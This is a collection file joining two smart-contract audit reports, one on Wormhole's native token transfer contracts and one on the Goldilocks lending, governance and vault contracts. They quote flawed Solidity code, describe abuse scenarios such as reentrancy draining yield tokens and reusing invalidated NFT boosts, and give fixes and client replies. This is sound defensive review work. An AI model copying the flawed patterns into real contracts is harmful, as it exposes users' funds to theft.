**Impact:** A bug in the addition/removal of transceivers could go unnoticed since the inline invariant checks on the threshold storage are not being performed here despite being modified.

**Recommended Mitigation:** Ensure `NttManagerState::_checkThresholdInvariants` is called within `NttManagerState::setTransceiver` and `NttManagerState::removeTransceiver`.

**Wormhole Foundation:** Fixed in [PR \#381](https://github.com/wormhole-foundation/example-native-token-transfers/pull/381).

**Cyfrin:** Verified. The threshold invariants are now checked when Transceivers are both added and removed. As noted, this change prevents an admin from disabling all the transceivers from an NTT manager, meaning there has to be at least 1 enabled Transceiver at all times when`numRegisteredTransceivers > 0`.

\clearpage
## Informational


### Unchained initializers should be called in `PausableOwnable::__PausedOwnable_init` instead

While not an immediate issue in the current implementation, the direct use of initializer functions rather than their unchained equivalents should be avoided. These have been implemented and used in some places but not others, for example, [`__PausedOwnable_init`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/PausableOwnable.sol#L26-L29) which should be modified to avoid [potential duplicate initialization](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance) in future.

```solidity
function __PausedOwnable_init(address initialPauser, address owner) internal onlyInitializing {
    __Paused_init(initialPauser);
    __Ownable_init(owner);
}
```

**Wormhole Foundation:** This has been reviewed and has to impact on the current contracts. Any contract changes in the the future will be reviewed, including changes to libraries.

**Cyfrin:** Acknowledged.


### Incorrect topics[0] documented in `INTTManagerEvents` and `IRateLimiterEvents`

**Description:** Inline NatSpec documentation incorrectly specifies topics[0] for the following events:

1. [`INTTManagerEvents::TransceiverAdded`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/interfaces/INttManagerEvents.sol#L51-L52) 
Documented: `0xc6289e62021fd0421276d06677862d6b328d9764cdd4490ca5ac78b173f25883`;
Correct: `0xf05962b5774c658e85ed80c91a75af9d66d2af2253dda480f90bce78aff5eda5`.
2. [`INTTManagerEvents::TransceiverRemoved`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/interfaces/INttManagerEvents.sol#L59-L60) 
Documented: `0x638e631f34d9501a3ff0295873b29f50d0207b5400bf0e48b9b34719e6b1a39e`;
Correct: `0x697a3853515b88013ad432f29f53d406debc9509ed6d9313dcfe115250fcd18f`.
3. [`IRateLimiterEvents::OutboundTransferRateLimited`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/interfaces/IRateLimiterEvents.sol#L20-L21) 
Documented: `0x754d657d1363ee47d967b415652b739bfe96d5729ccf2f26625dcdbc147db68b`;
Correct: `0xf33512b84e24a49905c26c6991942fc5a9652411769fc1e448f967cdb049f08a`.

**Wormhole Foundation:** Inline NatSpec docs can be error-prone. Thinking about using Foundry as the source of truth for selectors/topics.

**Cyfrin:** Acknowledged.


### NatSpec documentation inconsistent with function/event signatures

Inline NatSpec documentation does not reflect the actual signatures in multiple cases:

1. Missing definition for the `recipientNttManagerAddress` in the `ITransceiver::sendMessage` [NatSpec](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/interfaces/ITransceiver.sol#L27-L32):
```solidity
/// @dev Send a message to another chain.
/// @param recipientChain The Wormhole chain ID of the recipient.
/// @param instruction An additional Instruction provided by the Transceiver to be
/// executed on the recipient chain.
/// @param nttManagerMessage A message to be sent to the nttManager on the recipient chain.
function sendMessage(
    uint16 recipientChain, //@note wormhole chain id
    TransceiverStructs.TransceiverInstruction memory instruction, //@note same as above
    bytes memory nttManagerMessage,
    bytes32 recipientNttManagerAddress
) external payable;
```

2. Missing definition for `sequence` in the `IRateLimiterEvents::OutboundTransferRateLimited` [NatSpec](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/interfaces/IRateLimiterEvents.sol#L19-L25):
```solidity
/// @notice Emitted when an outbound transfer is rate limited.
/// @dev Topic0
///      0x754d657d1363ee47d967b415652b739bfe96d5729ccf2f26625dcdbc147db68b.
/// @param sender The initial sender of the transfer.
/// @param amount The amount to be transferred.
/// @param currentCapacity The capacity left for transfers within the 24-hour window.
event OutboundTransferRateLimited(
    address indexed sender, uint64 sequence, uint256 amount, uint256 currentCapacity
);
```

**Wormhole Foundation:** Inline NatSpec docs can be error-prone. Thinking about using Foundry as the source of truth for selectors/topics.

**Cyfrin:** Acknowledged.


### Unused `PausableUpgradeable::CannotRenounceWhilePaused` error should be removed

[`PausableUpgradeable::CannotRenounceWhilePaused`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/PausableUpgradeable.sol#L50-L53) is a custom error defined as follows:
```solidity
/**
 * @dev Cannot renounce the pauser capability when the contract is in the `PAUSED` state
 */
error CannotRenounceWhilePaused(address account);
```
The above error and inline comments imply that the pauser capability cannot be transferred when a contract is in a `PAUSED` state. However, no such check is performed in `PausableOwnable::transferPauserCapability`:

```solidity
/**
 * @dev Transfers the ability to pause to a new account (`newPauser`).
 */
function transferPauserCapability(address newPauser) public virtual onlyOwnerOrPauser {
    PauserStorage storage $ = _getPauserStorage();
    address oldPauser = $._pauser;
    $._pauser = newPauser;
    emit PauserTransferred(oldPauser, newPauser);
}
```

Given that it is understood this is not an error of omission, where stated functionality is not implemented in the function, but rather an unused custom error that is not intended to be used, it is recommended that the definition be removed.

**Wormhole Foundation:** Fixed in [PR \#244](https://github.com/wormhole-foundation/example-native-token-transfers/pull/244).

**Cyfrin:** Verified. The unused error has been removed.


### Multiple `staticcall` success booleans are not checked

The success boolean returned when performing a `staticcall` on the given ERC20 token is not currently checked for any of the instances. It is understood this is a trust assumption in that legitimate implementations should always have `IERC20::decimals` implemented and should not revert when calling `IERC20::balanceOf`; however, it is recommended to check this returned value so as to guarantee the impossibility of erroneously using the revert data when expecting to decode something else.

```solidity
function _getTokenBalanceOf(
    address tokenAddr,
    address accountAddr
) internal view returns (uint256) {
    (, bytes memory queriedBalance) =
        tokenAddr.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, accountAddr));
    return abi.decode(queriedBalance, (uint256));
}
```

**Wormhole Foundation:** Fixed in [PR \#375](https://github.dev/wormhole-foundation/example-native-token-transfers/pull/375).

**Cyfrin:** Verified. The success booleans are now checked.


### Canonical NTT chain ID should be fetched directly from Wormhole or mapped accordingly

Currently, the immutable `chainId` variable is assigned the value passed to the `NttManager` [constructor](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManager.sol#L26-L32
) by the deployer:

```solidity
constructor(
    address _token,
    Mode _mode,
    uint16 _chainId,
    uint64 _rateLimitDuration
) NttManagerState(_token, _mode, _chainId, _rateLimitDuration) {}
```

However, no validation is performed to ensure that the chain identifier provided is as expected. Since this is intended to be the Wormhole chain ID, it should be validated against the value returned by the Wormhole contract. Otherwise, if the chain identifier does not match the Wormhole chain identifier, given the understanding that the ID is not necessarily required to be the Wormhole chain ID, then this state should be included within the `WormholeTransceiver` payload [published](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiverState.sol#L80) to Wormhole since it will differ from the emitter chain included in the VAA.

If it is decided to make the Wormhole chain ID the canonical chain ID, different Transceiver implementations should map to the corresponding chain ID representations within their logic. As such, the Wormhole address should be passed to the constructor of the NTT Manager, querying the chain ID directly from the Wormhole Core Bridge instead of taking an arbitrary value in the constructor as described above.

**Wormhole Foundation:** We have elected not to fetch the chain id directly from the core bridge in order to make this less opinionated. This will be documented and the mapping of chain ids can be implemented when required.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Unnecessary type casts of proxied storage slots from `bytes32` to `uint256`

There are multiple instances where proxied storage slots are cast from type `bytes32` to `uint256`; however, this is not necessary as the EVM uses 32-byte words, meaning that these types are interchangeable when considering the subsequent inline assembly assignment. One example can be found in [`Governance::_getConsumedGovernanceActionsStorage`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/wormhole/Governance.sol#L34-L43):

```solidity
function _getConsumedGovernanceActionsStorage()
    private
    pure
    returns (mapping(bytes32 => bool) storage $)
{
    uint256 slot = uint256(CONSUMED_GOVERNANCE_ACTIONS_SLOT);
    assembly ("memory-safe") {
        $.slot := slot
    }
}
```

Consider [removing this type cast](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/789ba4f167cc94088e305d78e4ae6f3c1ec2e6f1/contracts/utils/PausableUpgradeable.sol#L25-L31) to save gas.

**Wormhole Foundation:** To do this we could have to precompute the constants since this otherwise leads to a compiler error.

**Cyfrin:** Acknowledged.


### Unnecessary stack variable in `Governance::encodeGeneralPurposeGovernanceMessage`

[`Governance::encodeGeneralPurposeGovernanceMessage`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/wormhole/Governance.sol#L126-L144) currently assigns the stack variable `callDataLength`; however, this is not necessary as the (already checked) downcast can be performed directly within the subsequent packed encoding.

```solidity
function encodeGeneralPurposeGovernanceMessage(GeneralPurposeGovernanceMessage memory m)
    public
    pure
    returns (bytes memory encoded)
{
    if (m.callData.length > type(uint16).max) {
        revert PayloadTooLong(m.callData.length);
    }
    uint16 callDataLength = uint16(m.callData.length);
    return abi.encodePacked(
        MODULE,
        m.action,
        m.chain,
        m.governanceContract,
        m.governedContract,
        callDataLength,
        m.callData
    );
}
```

Consider removing this stack variable to save gas.

**Wormhole Foundation:** This is used as a view and is not called internally, so gas is not a concern.

**Cyfrin:** Acknowledged.


### Optimize the `TrimmedAmount` struct as a bit-packed `uint72` user-defined type

The existing [`TrimmedAmount`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/TrimmedAmount.sol#L5-L8) abstraction has a [runtime gas overhead](https://soliditylang.org/blog/2021/09/27/user-defined-value-types/) due to allocation of the struct:
```solidity
struct TrimmedAmount {
    uint64 amount;
    uint8 decimals;
}
```

This could be mitigated by instead implementing a user-defined type that is a bit-packed `uint72` representation of a token amount and its decimals. The use of a `uint72` type ensures that the existing width of 9 bytes is maintained, which allows for tight packing elsewhere in storage, such as in the `RateLimitParams` struct:
```solidity
struct RateLimitParams {
        TrimmedAmount limit;
        TrimmedAmount currentCapacity;
        uint64 lastTxTimestamp;
    }
```
therefore keeping this definition contained within a single word.

Despite the non-trivial refactoring effort required, a user-defined value type is advantageous here as it would allow for the trimmed amounts to be stack-allocated and arithmetic operators to be overloaded.

**Wormhole Foundation:** Fixed in [PR \#248](https://github.com/wormhole-foundation/example-native-token-transfers/pull/248).

**Cyfrin:** Verified. Some comments are incorrect, and further small optimizations could be made, but otherwise appears correct.


### Optimize invariant check iterations in `TransceiverRegistry::_checkTransceiversInvariants`

The first loop over all enabled transceivers in [`TransceiverRegistry::_checkTransceiversInvariants`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/TransceiverRegistry.sol#L211-L234) could instead be included in the top level of the nested loop directly below to save multiple iterations and hence gas.
```diff
function _checkTransceiversInvariants() internal view {
    _NumTransceivers storage _numTransceivers = _getNumTransceiversStorage();
    address[] storage _enabledTransceivers = _getEnabledTransceiversStorage();

    uint256 numTransceiversEnabled = _numTransceivers.enabled;
    assert(numTransceiversEnabled == _enabledTransceivers.length);

-   for (uint256 i = 0; i < numTransceiversEnabled; i++) {
-       _checkTransceiverInvariants(_enabledTransceivers[i]);
-   }
-
    // invariant: each transceiver is only enabled once
    for (uint256 i = 0; i < numTransceiversEnabled; i++) {
+       _checkTransceiverInvariants(_enabledTransceivers[i]);
        for (uint256 j = i + 1; j < numTransceiversEnabled; j++) {
            assert(_enabledTransceivers[i] != _enabledTransceivers[j]);
        }
    }

    // invariant: numRegisteredTransceivers <= MAX_TRANSCEIVERS
    assert(_numTransceivers.registered <= MAX_TRANSCEIVERS);
}
```

**Wormhole Foundation:** Admin only method so gas usage is not as critical.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-04-11-cyfrin-wormhole-evm-ntt-v2.md ------


------ FILE START car/reports_md/2024-04-14-cyfrin-goldilocks-v1.1.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## High Risk


### `Goldilend.lock()` will always revert

**Severity:** High

**Description:** In `lock()`, it calls `_refreshiBGT()` before pulling `iBGT` from the user and will revert while calling `iBGTVault(ibgtVault).stake()`.

```solidity
  function lock(uint256 amount) external {
    uint256 mintAmount = _GiBGTMintAmount(amount);
    poolSize += amount;
    _refreshiBGT(amount); //@audit should call after depositing funds
    SafeTransferLib.safeTransferFrom(ibgt, msg.sender, address(this), amount);
    _mint(msg.sender, mintAmount);
    emit iBGTLock(msg.sender, amount);
  }
...
  function _refreshiBGT(uint256 ibgtAmount) internal {
    ERC20(ibgt).approve(ibgtVault, ibgtAmount);
    iBGTVault(ibgtVault).stake(ibgtAmount); //@audit will revert here
  }
```

**Impact:** Users can't lock `iBGT` as `lock()` always reverts.

**Recommended Mitigation:** `_refreshiBGT()` should be called after pulling funds from the user.

**Client:** Fixed in [PR #1](https://github.com/0xgeeb/goldilocks-core/pull/1)

**Cyfrin:** Verified.

### Wrong `PoolSize` increment in `Goldilend.repay()`

**Severity:** High

**Description:** When a user repays his loan using `repay()`, it increases `poolSize` with the repaid interest. During the increment, it uses the wrong amount.

```solidity
  function repay(uint256 repayAmount, uint256 _userLoanId) external {
    Loan memory userLoan = loans[msg.sender][_userLoanId];
    if(userLoan.borrowedAmount < repayAmount) revert ExcessiveRepay();
    if(block.timestamp > userLoan.endDate) revert LoanExpired();
    uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);
    uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio);
    outstandingDebt -= repayAmount - interest > outstandingDebt ? outstandingDebt : repayAmount - interest;
    loans[msg.sender][_userLoanId].borrowedAmount -= repayAmount;
    loans[msg.sender][_userLoanId].interest -= interest;
    poolSize += userLoan.interest * (1000 - (multisigShare + apdaoShare)) / 1000; //@audit should use interest instead of userLoan.interest
...
  }
```

It should use `interest` instead of `userLoan.interest` because the user repaid `interest` only.

**Impact:** `poolSize` would be tracked wrongly after calling `repay()` and several functions wouldn't work as expected.

**Recommended Mitigation:** `poolSize` should be updated using `interest`.

**Client:** Fixed in [PR #2](https://github.com/0xgeeb/goldilocks-core/pull/2)

**Cyfrin:** Verified.

### Users can extend an expired boost using invalidated NFTs.

**Severity:** High

**Description:** In `Goldilend.sol#L251`, a user can extend a boost with invalidated NFTs.
- The user has created a boost with a valid NFT.
- After that, the NFT was invalidated using `adjustBoosts()`.
- After the original boost is expired, the user can just call `boost()` with empty arrays, and the boost will be extended again with the original magnitude.

```solidity
  function _buildBoost(
    address[] calldata partnerNFTs,
    uint256[] calldata partnerNFTIds
  ) internal returns (Boost memory newUserBoost) {
    uint256 magnitude;
    Boost storage userBoost = boosts[msg.sender];
    if(userBoost.expiry == 0) {
...
    }
    else {
      address[] storage nfts = userBoost.partnerNFTs;
      uint256[] storage ids = userBoost.partnerNFTIds;
      magnitude = userBoost.boostMagnitude; //@audit use old magnitude without checking
      for (uint256 i = 0; i < partnerNFTs.length; i++) {
        magnitude += partnerNFTBoosts[partnerNFTs[i]];
        nfts.push(partnerNFTs[i]);
        ids.push(partnerNFTIds[i]);
      }
      newUserBoost = Boost({
        partnerNFTs: nfts,
        partnerNFTIds: ids,
        expiry: block.timestamp + boostLockDuration,
        boostMagnitude: magnitude
      });
    }
  }
```

**Impact:** Malicious users can use invalidated NFTs to extend their boosts forever.

**Recommended Mitigation:** Whenever users extend their boosts, their NFTs should be evaluated again.

**Client:** Fixed in [PR #3](https://github.com/0xgeeb/goldilocks-core/pull/3)

**Cyfrin:** Verified.

### Team members can't unstake the initial allocation forever.

**Severity:** High

**Description:** When users call `unstake()`, it calculates the vested amount using `_vestingCheck()`.

```solidity
  function _vestingCheck(address user, uint256 amount) internal view returns (uint256) {
    if(teamAllocations[user] > 0) return 0; //@audit return 0 for team members
    uint256 initialAllocation = seedAllocations[user];
    if(initialAllocation > 0) {
      if(block.timestamp < vestingStart) return 0;
      uint256 vestPortion = FixedPointMathLib.divWad(block.timestamp - vestingStart, vestingEnd - vestingStart);
      return FixedPointMathLib.mulWad(vestPortion, initialAllocation) - (initialAllocation - stakedLocks[user]);
    }
    else {
      return amount;
    }
  }
```

But it returns 0 for team members and they can't unstake forever.
Furthermore, in `stake()`, it just prevents seed investors, not team members. So if team members have staked additionally, they can't unstake also.

**Impact:** Team members can't unstake forever.

**Recommended Mitigation:** `_vestingCheck` should use the same logic as initial investors for team mates.

**Client:** Acknowledged, it is intended that the team cannot unstake their tokens. [PR #4](https://github.com/0xgeeb/goldilocks-core/pull/4) fixes issue of `stake` not preventing team members from staking.

**Cyfrin:** Verified.

### In `GovLocks`, it shouldn't use a `deposits` mapping

**Severity:** High

**Description:** In `GovLocks`, it tracks every user's deposit amount using a `deposits` mapping.
As users can transfer `govLocks` freely, they might have fewer `deposits` than their `govLocks` balance and wouldn't be able to withdraw when they want.

```solidity
  function deposit(uint256 amount) external {
    deposits[msg.sender] += amount; //@audit no need
    _moveDelegates(address(0), delegates[msg.sender], amount);
    SafeTransferLib.safeTransferFrom(locks, msg.sender, address(this), amount);
    _mint(msg.sender, amount);
  }

  /// @notice Withdraws Locks to burn Govlocks
  /// @param amount Amount of Locks to withdraw
  function withdraw(uint256 amount) external {
    deposits[msg.sender] -= amount; //@audit no need
    _moveDelegates(delegates[msg.sender], address(0), amount);
    _burn(msg.sender, amount);
    SafeTransferLib.safeTransfer(locks, msg.sender, amount);
  }
```

Here is a possible scenario.
- Alice has deposited 100 `LOCKS` and got 100 `govLOCKS`. Also `deposits[Alice] = 100`.
- Bob bought 50 `govLOCKS` from Alice to get voting power.
- When Bob tries to call `withdraw()`, it will revert because `deposits[Bob] = 0` although he has 50 `govLOCKS`.

**Impact:** Users wouldn't be able to withdraw `LOCKS` with `govLOCKS`.

**Recommended Mitigation:** We don't need to use the `deposits` mapping at all and we can just rely on `govLocks` balances.

**Client:** Fixed in [PR #8](https://github.com/0xgeeb/goldilocks-core/pull/8)

**Cyfrin:** Verified.

### Some functions of `Goldilend` will revert forever.

**Severity:** High

**Description:** `Goldilend.multisigInterestClaim()/apdaoInterestClaim()/sunsetProtocol()` will revert forever because they doesn't withdraw `ibgt` from `ibgtVault` before the transfer.

```solidity
  function multisigInterestClaim() external {
    if(msg.sender != multisig) revert NotMultisig();
    uint256 interestClaim = multisigClaims;
    multisigClaims = 0;
    SafeTransferLib.safeTransfer(ibgt, multisig, interestClaim);
  }

  /// @inheritdoc IGoldilend
  function apdaoInterestClaim() external {
    if(msg.sender != apdao) revert NotAPDAO();
    uint256 interestClaim = apdaoClaims;
    apdaoClaims = 0;
    SafeTransferLib.safeTransfer(ibgt, apdao, interestClaim);
  }

...

  function sunsetProtocol() external {
    if(msg.sender != timelock) revert NotTimelock();
    SafeTransferLib.safeTransfer(ibgt, multisig, poolSize - outstandingDebt);
  }
```

As `ibgtVault` has all `ibgt` of `Goldilend`, they should withdraw from `ibgtVault` first.

**Impact:** `Goldilend.multisigInterestClaim()/apdaoInterestClaim()/sunsetProtocol()` will revert forever.

**Recommended Mitigation:** 3 functions should be changed like the below.

```diffclea
  function multisigInterestClaim() external {
    if(msg.sender != multisig) revert NotMultisig();
    uint256 interestClaim = multisigClaims;
    multisigClaims = 0;
+  iBGTVault(ibgtVault).withdraw(interestClaim);
    SafeTransferLib.safeTransfer(ibgt, multisig, interestClaim);
  }

  /// @inheritdoc IGoldilend
  function apdaoInterestClaim() external {
    if(msg.sender != apdao) revert NotAPDAO();
    uint256 interestClaim = apdaoClaims;
    apdaoClaims = 0;
+  iBGTVault(ibgtVault).withdraw(interestClaim);
    SafeTransferLib.safeTransfer(ibgt, apdao, interestClaim);
  }

...

  function sunsetProtocol() external {
    if(msg.sender != timelock) revert NotTimelock();
+  iBGTVault(ibgtVault).withdraw(poolSize - outstandingDebt);
    SafeTransferLib.safeTransfer(ibgt, multisig, poolSize - outstandingDebt);
  }
```

**Client:** Fixed in [PR #9](https://github.com/0xgeeb/goldilocks-core/pull/9) and [PR #12](https://github.com/0xgeeb/goldilocks-core/pull/12)

**Cyfrin:** Verified.

## Medium Risk


### `Goldigovernor._getProposalState()` shouldn't use `totalSupply`

**Severity:** Medium

**Description:** In `_getProposalState()`, it uses `Goldiswap(goldiswap).totalSupply()` during the comparison.

```solidity
  function _getProposalState(uint256 proposalId) internal view returns (ProposalState) {
    Proposal storage proposal = proposals[proposalId];
    if (proposal.cancelled) return ProposalState.Canceled;
    else if (block.number <= proposal.startBlock) return ProposalState.Pending;
    else if (block.number <= proposal.endBlock) return ProposalState.Active;
    else if (proposal.eta == 0) return ProposalState.Succeeded;
    else if (proposal.executed) return ProposalState.Executed;
    else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < Goldiswap(goldiswap).totalSupply() / 20) { //@audit shouldn't use totalSupply
      return ProposalState.Defeated;
    }
    else if (block.timestamp >= proposal.eta + Timelock(timelock).GRACE_PERIOD()) {
      return ProposalState.Expired;
    }
    else {
      return ProposalState.Queued;
    }
  }
```

As `totalSupply` is increasing in real time, a `Queued` proposal might be changed to `Defeated` one unexpectedly due to the increased supply.

**Impact:** A proposal state might be changed unexpectedly.

**Recommended Mitigation:** We should introduce another mechanism for the quorum check rather than using `totalSupply`.

**Client:** Fixed in [PR #5](https://github.com/0xgeeb/goldilocks-core/pull/5)

**Cyfrin:** Verified.

### In `Goldivault.redeemYield()`, users can redeem more yield tokens using reentrancy

**Severity:** Medium

**Description:** Possible reentrancy in `Goldivault.redeemYield()` if `yieldToken` has a `beforeTokenTransfer` hook.

- Let's assume `yt.totalSupply = 100, yieldToken.balance = 100` and the user has 20 yt.
- The user calls `redeemYield()` with 10 yt.
- Then `yt.totalSupply` will be changed to 90 and it will transfer `100 * 10 / 100 = 10 yieldToken` to the user.
- Inside the `beforeTokenTransfer` hook, the user calls `redeemYield()` again with 10 yt.
- As `yieldToken.balance` is still 100, he will receive `100 * 10 / 90 = 11 yieldToken`.

```solidity
  function redeemYield(uint256 amount) external {
    if(amount == 0) revert InvalidRedemption();
    if(block.timestamp < concludeTime + delay || !concluded) revert NotConcluded();
    uint256 yieldShare = FixedPointMathLib.divWad(amount, ERC20(yt).totalSupply());
    YieldToken(yt).burnYT(msg.sender, amount);
    uint256 yieldTokensLength = yieldTokens.length;
    for(uint8 i; i < yieldTokensLength; ++i) {
      uint256 finalYield;
      if(yieldTokens[i] == depositToken) {
        finalYield = ERC20(yieldTokens[i]).balanceOf(address(this)) - depositTokenAmount;
      }
      else {
        finalYield = ERC20(yieldTokens[i]).balanceOf(address(this));
      }
      uint256 claimable = FixedPointMathLib.mulWad(finalYield, yieldShare);
      SafeTransferLib.safeTransfer(yieldTokens[i], msg.sender, claimable);
    }
    emit YieldTokenRedemption(msg.sender, amount);
  }
```

**Impact:** Malicious users can steal `yieldToken` using `redeemYield()`.

**Recommended Mitigation:** We should add a `nonReentrant` modifier to `redeemYield()`.

**Client:** Fixed in [PR #13](https://github.com/0xgeeb/goldilocks-core/pull/13)

**Cyfrin:** Verified.

### Wrong validation in `Goldigovernor.cancel()`

**Severity:** Medium

**Description:** In `Goldigovernor.cancel()`, the proposer should have fewer votes than `proposalThreshold` to cancel his proposal.

```solidity
  function cancel(uint256 proposalId) external {
    if(_getProposalState(proposalId) == ProposalState.Executed) revert InvalidProposalState();
    Proposal storage proposal = proposals[proposalId];
    if(msg.sender != proposal.proposer) revert NotProposer();
    if(GovLocks(govlocks).getPriorVotes(proposal.proposer, block.number - 1) > proposalThreshold) revert AboveThreshold(); //@audit incorrect
    proposal.cancelled = true;
    uint256 targetsLength = proposal.targets.length;
    for (uint256 i = 0; i < targetsLength; i++) {
      Timelock(timelock).cancelTransaction(proposal.targets[i], proposal.eta, proposal.values[i], proposal.calldatas[i], proposal.signatures[i]);
    }
    emit ProposalCanceled(proposalId);
  }
```

**Impact:** A proposer can't cancel his proposal unless he decreases his voting power.

**Recommended Mitigation:** It should be modified like this.

```solidity
if(msg.sender != proposal.proposer && GovLocks(govlocks).getPriorVotes(proposal.proposer, block.number - 1) > proposalThreshold) revert Error;
```

**Client:** Fixed in [PR #7](https://github.com/0xgeeb/goldilocks-core/pull/7)

**Cyfrin:** Verified.

### Users wouldn't cancel their proposals due to the increased `proposalThreshold`.

**Severity:** Medium

**Description:** When users call `cancel()`, it validates the caller's voting power with `proposalThreshold` which can be changed using `setProposalThreshold()`.

```solidity
  function setProposalThreshold(uint256 newProposalThreshold) external {
    if(msg.sender != multisig) revert NotMultisig();
    if(newProposalThreshold < MIN_PROPOSAL_THRESHOLD || newProposalThreshold > MAX_PROPOSAL_THRESHOLD) revert InvalidVotingParameter();
    uint256 oldProposalThreshold = proposalThreshold;
    proposalThreshold = newProposalThreshold;
    emit ProposalThresholdSet(oldProposalThreshold, proposalThreshold);
  }
```

Here is a possible scenario.
- Let's assume `proposalThreshold = 100` and a user has 100 voting power.
- The user has proposed a proposal using `propose()`.
- After that, `proposalThreshold` was increased to 150 by `multisig`.
- When the user calls `cancel()`, it will revert as he doesn't have enough voting power.

**Impact:** Users wouldn't cancel their proposals due to the increased `proposalThreshold`.

**Recommended Mitigation:** It would be good to cache `proposalThreshold` as a proposal state.

**Client:** Acknowledged, we will ensure to only change parameters while there are no pending proposals.

**Cyfrin:** Acknowledged.

### `Goldilend.liquidate()` might revert due to underflow

**Severity:** Medium

**Description:** In `repay()`, there would be a rounding during the `interest` calculation.

```solidity
  function repay(uint256 repayAmount, uint256 _userLoanId) external {
      Loan memory userLoan = loans[msg.sender][_userLoanId];
      if(userLoan.borrowedAmount < repayAmount) revert ExcessiveRepay();
      if(block.timestamp > userLoan.endDate) revert LoanExpired();
      uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);
L425  uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio); //@audit rounding issue
      outstandingDebt -= repayAmount - interest > outstandingDebt ? outstandingDebt : repayAmount - interest;
      ...
  }
...
  function liquidate(address user, uint256 _userLoanId) external {
      Loan memory userLoan = loans[msg.sender][_userLoanId];
      if(block.timestamp < userLoan.endDate || userLoan.liquidated || userLoan.borrowedAmount == 0) revert Unliquidatable();
      loans[user][_userLoanId].liquidated = true;
      loans[user][_userLoanId].borrowedAmount = 0;
L448  outstandingDebt -= userLoan.borrowedAmount - userLoan.interest;
      ...
  }
```

Here is a possible scenario.
- There are 2 borrowers of `borrowedAmount = 100, interest = 10`. And `outstandingDebt = 2 * (100 - 10) = 180`.
- The first borrower calls `repay()` with `repayAmount = 100`.
- Due to the rounding issue at L425, `interest` is 9 instead of 10. And `outstandingDebt = 180 - (100 - 9) = 89`.
- In `liquidate()` for the second borrower, it will revert at L448 because `outstandingDebt = 89 < borrowedAmount - interest = 90`.

**Impact:** `liquidate()` might revert due to underflow.

**Recommended Mitigation:** In `liquidate()`, `outstandingDebt` should be updated like the below.

```diff
  /// @inheritdoc IGoldilend
  function liquidate(address user, uint256 _userLoanId) external {
    Loan memory userLoan = loans[msg.sender][_userLoanId];
    if(block.timestamp < userLoan.endDate || userLoan.liquidated || userLoan.borrowedAmount == 0) revert Unliquidatable();
    loans[user][_userLoanId].liquidated = true;
    loans[user][_userLoanId].borrowedAmount = 0;
+  uint256 debtToRepay = userLoan.borrowedAmount - userLoan.interest;
+  outstandingDebt -= debtToRepay > outstandingDebt ? outstandingDebt : debtToRepay;
   ...
  }
```

**Client:** Fixed in [PR #10](https://github.com/0xgeeb/goldilocks-core/pull/10)

**Cyfrin:** Verified.

### In `Goldigovernor`, wrong assumption of block time

**Severity:** Medium

**Description:** In `Goldigovernor.sol`, voting period/delay limits are set with 15s block time.

```solidity
  /// @notice Minimum voting period
  uint32 public constant MIN_VOTING_PERIOD = 5760; // About 24 hours

  /// @notice Maximum voting period
  uint32 public constant MAX_VOTING_PERIOD = 80640; // About 2 weeks

  /// @notice Minimum voting delay
  uint32 public constant MIN_VOTING_DELAY = 1;

  /// @notice Maximum voting delay
  uint32 public constant MAX_VOTING_DELAY = 40320; // About 1 week
```

But Berachain has 5s block time according to [its documentation](https://docs.berachain.com/faq/#how-well-does-berachain-perform).

```
Berachain has the following properties:

- Block time: 5s
```

So these limits will be set shorter than expected.

**Impact:** Voting period/delay limits will be set shorter than expected.

**Recommended Mitigation:** We should calculate these limits with 5s block time.

**Client:** Fixed in [PR #14](https://github.com/0xgeeb/goldilocks-core/pull/14)

**Cyfrin:** Verified.

## Low Risk


### `Goldivault.changeProtocolParameters()` shouldn't update `endTime`.

**Description:** `Goldivault.changeProtocolParameters()` updates `endTime` only without changing `startTime`.

```solidity
  function changeProtocolParameters(
    uint256 _earlyWithdrawalFee,
    uint256 _yieldFee,
    uint256 _delay,
    uint256 _duration
  ) external {
    if(msg.sender != timelock) revert NotTimelock();
    earlyWithdrawalFee = _earlyWithdrawalFee;
    yieldFee = _yieldFee;
    delay = _delay;
    duration = _duration;
    endTime = block.timestamp + _duration;
  }
```

It's more appropriate not to update `endTime` as this function is just to change parameters.

**Client:** Fixed in [PR #11](https://github.com/0xgeeb/goldilocks-core/pull/11)

**Cyfrin:** Verified.

